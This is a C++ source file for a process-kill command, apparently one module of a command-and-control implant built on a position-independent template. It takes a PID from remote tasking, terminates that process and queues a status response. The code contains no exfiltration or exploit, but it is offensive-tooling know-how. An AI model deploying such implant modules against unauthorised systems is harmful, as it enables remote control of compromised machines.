#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_KILL

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_kill(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t pid = parser_int32( params );
    if ( pid == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid PID" ) ) );
        return;
    }

    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_TERMINATE, FALSE, pid );
    if ( !h_proc ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenProcess failed" ) ) );
        return;
    }

    BOOL ok = inst.kernel32.TerminateProcess( h_proc, 1 );
    inst.kernel32.CloseHandle( h_proc );

    if ( ok ) {
        char msg[64] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "killed PID " ) ) );
        char num[12];
        int_to_str( num, pid, 10 );
        str_concat( msg, num );
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "TerminateProcess failed" ) ) );
    }
}

#endif
